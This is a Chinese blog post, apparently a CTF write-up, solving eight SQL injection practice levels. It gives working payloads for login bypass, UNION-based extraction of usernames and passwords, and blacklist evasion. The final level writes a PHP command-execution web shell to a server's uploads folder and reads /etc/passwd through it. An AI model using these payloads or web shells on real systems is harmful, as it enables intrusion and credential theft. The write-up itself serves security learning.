@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="UA-100684831-1">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"kele1997.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="sql注入习题 来源于ctfs.me的一道习题，实在做不出来，google了wp,发现这道题目是引自于其他习题集了，而且原题目是有源码的。。。于是趁机把他的题目做了一遍 ## level1 这道题目其实没有源码也是可以做的，不过需要简单思考一下 $query &#x3D; &quot;SELECT * FROM secrets WHERE session_id &#x3D; &#39;&quot; . $_POST[&#39;session_id&#39;]">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql 注入练习题">
+<meta property="og:url" content="https://kele1997.github.io/2018/02/15/2018-2-15-sqlpractice/index.html">
+<meta property="og:site_name" content="可乐的博客">
+<meta property="og:description" content="sql注入习题 来源于ctfs.me的一道习题，实在做不出来，google了wp,发现这道题目是引自于其他习题集了，而且原题目是有源码的。。。于是趁机把他的题目做了一遍 ## level1 这道题目其实没有源码也是可以做的，不过需要简单思考一下 $query &#x3D; &quot;SELECT * FROM secrets WHERE session_id &#x3D; &#39;&quot; . $_POST[&#39;session_id&#39;]">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2018-02-15T22:53:26.000Z">
+<meta property="article:modified_time" content="2020-11-23T10:12:28.221Z">
+<meta property="article:author" content="Kele">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="sqli">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://kele1997.github.io/2018/02/15/2018-2-15-sqlpractice/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>sql 注入练习题 | 可乐的博客</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-100684831-1"></script>
+    <script>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-100684831-1');
+      }
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">可乐的博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-commonweal">
+
+    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://kele1997.github.io/2018/02/15/2018-2-15-sqlpractice/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Kele">
+      <meta itemprop="description" content="菜鸡">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="可乐的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sql 注入练习题
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2018-02-15 22:53:26" itemprop="dateCreated datePublished" datetime="2018-02-15T22:53:26+00:00">2018-02-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-11-23 10:12:28" itemprop="dateModified" datetime="2020-11-23T10:12:28+00:00">2020-11-23</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4.3k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="sql注入习题">sql注入习题</h1>
+<p>来源于ctfs.me的一道习题，实在做不出来，google了wp,发现这道题目是引自于其他习题集了，而且原题目是有源码的。。。于是趁机把他的题目做了一遍<br />
+## level1 这道题目其实没有源码也是可以做的，不过需要简单思考一下<br />
+<code>$query = "SELECT * FROM secrets WHERE session_id = '" . $_POST['session_id'] . "'";</code> 这个语句，我们需要让where 后面的为true，所以我们需要用到or，比较简单的题目<br />
+payload:<code>1' or 1=1 #</code><br />
+在get your secrets里面输入,就可以得到所有的secrets，第一个就是flag</p>
+<h2 id="level2">level2</h2>
+<p>这道题目在ctfs.me上很坑，我不晓得大佬是怎么做的。 假如不给源码，我首先想到的是万能密码登陆，一顿操作之后，发现<strong>注入点在用户名的位置</strong>登陆不了，gg<br />
+换思路，考虑这个登陆的回显<br />
+payload:<code>username:1'order by 1# &amp;password=dd</code><br />
+回显: username/password is invalid<br />
+payload:`username:1'order by 2# &amp;password=dd' 回显: invalid sql query</p>
+<p>可以知道只有一列，所以我们可以看看回显的位置<br />
+payload: <code>username=1' union select 1 -- -&amp;password=dd</code><br />
+回显。。。,回显出flag了，但是页面显示的不是真正的，查看源码发现另一个flag，get!</p>
+<hr />
+<p>假如给了源码，那就稍微简单一点了<br />
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])) &#123;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; $query &#x3D; &quot;SELECT flag FROM my_secret_table&quot;; We leave commented code in production because we&#39;re cool.</span><br><span class="line"> </span><br><span class="line">    $query &#x3D; &quot;SELECT username FROM users where username &#x3D; &#39;&quot; . $_POST[&#39;username&#39;] . &quot;&#39; and password &#x3D; ?&quot;;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; We use prepared statements, it must be secure.</span><br></pre></td></tr></table></figure> 直接构造payload:<code>username=1'union select flag from my_secret_table</code></p>
+<h2 id="level3---the-blacklist-saga-part-1">level3 - The Blacklist Saga (Part 1)</h2>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$filter &#x3D; array(&#39;union&#39;, &#39;select&#39;);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Remove all banned characters</span><br><span class="line">    foreach ($filter as $banned) &#123;</span><br><span class="line">        $_GET[&#39;q&#39;] &#x3D; preg_replace(&#39;&#x2F;&#39; . $banned . &#39;&#x2F;i&#39;, &#39;&#39;, $_GET[&#39;q&#39;]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>过滤union 和select 关键字,使用preg_replace替换掉union和select关键字，而且不区分大小写("/i")<br />
+以前经常看到这种绕过方式uni/**/on,这次尝试无效。。。<br />
+但是因为替换关键词为空字符，所以可以构造这种<code>uniunionon</code>，preg_replace把字符串中间的union替换为空白，其余字符再次组合成为union<br />
+payload:<code>1'uniunionon seleselectct 1,username,password from users #</code> 简单过程: 1. 使用order by 测列数 <code>1'order by 3#</code> 2. 然后利用information_schema库查表名，列名，就可以了</p>
+<p>得到flag</p>
+<h2 id="level-4---the-blacklist-saga-part-2">Level 4 - The Blacklist Saga (Part 2)</h2>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$filter &#x3D; array(&#39;UNION&#39;, &#39;SELECT&#39;);</span><br><span class="line"></span><br><span class="line">   &#x2F;&#x2F; Remove all banned characters</span><br><span class="line">   foreach ($filter as $banned) &#123;</span><br><span class="line">       if (strpos($_GET[&#39;q&#39;], $banned) !&#x3D;&#x3D; false) die(&quot;Hacker detected&quot;); </span><br><span class="line">       if (strpos($_GET[&#39;q&#39;], strtolower($banned)) !&#x3D;&#x3D; false) die(&quot;Hacker detected&quot;); </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>比较黑名单的大写形式，小写形式，但是漏了大小写混合，所以可以使用大小混合绕过<br />
+payload:<code>1'uNion Select 1,username,password from users #</code></p>
+<h2 id="level-5---the-blacklist-saga-part-3">Level 5 - The Blacklist Saga (Part 3)</h2>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Ban space character</span><br><span class="line">    if (strpos($_GET[&#39;q&#39;], &quot; &quot;) !&#x3D;&#x3D; false) die(&quot;Hacker detected&quot;);</span><br></pre></td></tr></table></figure>
+<p>过滤了空格，空格绕过，使用mysql的注释/**/ payload:<code>1'union/**/select/**/1,username,password/**/from/**/users/**/#</code></p>
+<h2 id="level-6---the-blacklist-saga-part-4">Level 6 - The Blacklist Saga (Part 4)</h2>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Ban space character</span><br><span class="line">    if (strpos($_GET[&#39;q&#39;], &quot;&#39;&quot;) !&#x3D;&#x3D; false) die(&quot;Hacker detected&quot;); </span><br><span class="line">    if (strpos($_GET[&#39;q&#39;], &#39;&quot;&#39;) !&#x3D;&#x3D; false) die(&quot;Hacker detected&quot;);</span><br></pre></td></tr></table></figure>
+<p>过滤单引号和双引号，绕不过，但是可以通过原来的sql语句构造<br />
+<code>$query = "SELECT * FROM search_engine WHERE title LIKE '" . $_GET['q'].  "' OR description LIKE '" . $_GET['q'] .  "' OR link LIKE '" . $_GET['q'] . "';";</code><br />
+payload: <code>and 0 union select 1,username,password from users #\</code><br />
+具体:<br />
+select * from search_engine where title like '<strong>and 0 union select 1,username,password from users #\</strong>' or description like '<strong>and 0 union select 1,username,password from users #\</strong>' or link like '<strong>and 0 union select 1,username,password from users #\</strong>';<br />
+可以看到一共有6个单引号，但是由于'\'的作用，所以第二个，第四个，第六个单引号被转义了,用<strong>SQL</strong>代理<strong>and 0 union select 1,username,password from users #\</strong>，结果如下： <code>select * from search_engine where title like 'SQL \' or description like 'SQL \' or link like 'SQL\'</code> 去掉转义的单引号<br />
+<code>select * from search_engine where title like 'SQL  or description like 'SQL  or link like 'SQL</code> 还原<strong>SQL</strong>,因为title like 后面的参数<code>SQL or description like'是一个字符串，所以SQL不用还原，而且SQL最后面是一个注释符号，所以上面语句中第二个SQL后面被注释，可以省略</code>select * from search_engine where title like 'SQL or description like<code>and 0 union select 1,username,password from users #</code><br />
+再简化一下: <code>select * from search_engine where title like 'xxxx' and 0 union select 1,username,password from users #</code> ok</p>
+<h2 id="level-7">Level 7</h2>
+<p>先做level 8</p>
+<h2 id="level-8---the-final-challenge">Level 8 - The Final Challenge</h2>
+<p>查看源码，发现有两个隐藏表单 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--&lt;li&gt;&lt;a href&#x3D;&quot;&#x2F;uploads&#x2F;&quot;&gt;Our files&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;--&gt;</span><br><span class="line">&lt;!--&lt;li&gt;&lt;a href&#x3D;&quot;&#x2F;phpinfo.php&quot;&gt;Debug&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;--&gt;</span><br></pre></td></tr></table></figure> 可以知道允许上传的文件在uploads里面， 查看phpinfo<code>DOCUMENT_ROOT /var/www/html</code>，知道网站地址是这个，所以我们可以是用sql的into outifle 把php一句话，输出到php文件中 payload:<code>1 union select  "&lt;?php system($_GET[\"cmd\"]);?&gt; ", "" into outfile  "/var/www/html/uploads/temp2.php"#</code></p>
+<p><code>35.184.20.243:8003/uploads/temp2.php?cmd=ls</code><br />
+查看系统文件，flag在上一级目录里面，使用cat读取就可以了</p>
+<h2 id="leve7">leve7</h2>
+<p>使用level8的shell <code>cat /etc/passwd</code>得到flag,或者查看level7的flag.php源文件就可以得到flag<br />
+但是我觉得这可能有点问题，可能有其他的做法，还没有想到</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+              <a href="/tags/sqli/" rel="tag"># sqli</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2018/02/14/2018-2-14-metaweblogapi/" rel="prev" title="metaweblog API csdn python实现">
+      <i class="fa fa-chevron-left"></i> metaweblog API csdn python实现
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2018/02/16/2018-2-16-how-to-use-hashcat/" rel="next" title="hashcat的使用及相关">
+      hashcat的使用及相关 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sql注入习题"><span class="nav-number">1.</span> <span class="nav-text">sql注入习题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#level2"><span class="nav-number">1.1.</span> <span class="nav-text">level2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level3---the-blacklist-saga-part-1"><span class="nav-number">1.2.</span> <span class="nav-text">level3 - The Blacklist Saga (Part 1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-4---the-blacklist-saga-part-2"><span class="nav-number">1.3.</span> <span class="nav-text">Level 4 - The Blacklist Saga (Part 2)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-5---the-blacklist-saga-part-3"><span class="nav-number">1.4.</span> <span class="nav-text">Level 5 - The Blacklist Saga (Part 3)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-6---the-blacklist-saga-part-4"><span class="nav-number">1.5.</span> <span class="nav-text">Level 6 - The Blacklist Saga (Part 4)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-7"><span class="nav-number">1.6.</span> <span class="nav-text">Level 7</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-8---the-final-challenge"><span class="nav-number">1.7.</span> <span class="nav-text">Level 8 - The Final Challenge</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#leve7"><span class="nav-number">1.8.</span> <span class="nav-text">leve7</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Kele"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Kele</p>
+  <div class="site-description" itemprop="description">菜鸡</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">98</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">51</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/kele1997" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;kele1997" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:2363618563@qq.com" title="E-Mail → mailto:2363618563@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Kele</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">223k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">3:22</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/viz.js/1.7.1/viz.js'></script>
+  <script>
+    String.prototype.replaceAll = function(search, replacement) {
+      var target = this;
+      return target.split(search).join(replacement);
+    };
+
+    let vizObjects = document.querySelectorAll('.graphviz')
+
+    for (let item of vizObjects) {
+      let svg = undefined
+      try {
+        svg = Viz(item.textContent.replaceAll('–', '--'), 'svg')
+      } catch(e) {
+        svg = `<pre class="error">${e}</pre>`
+      }
+      item.outerHTML = svg
+    }
+  </script>
+
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
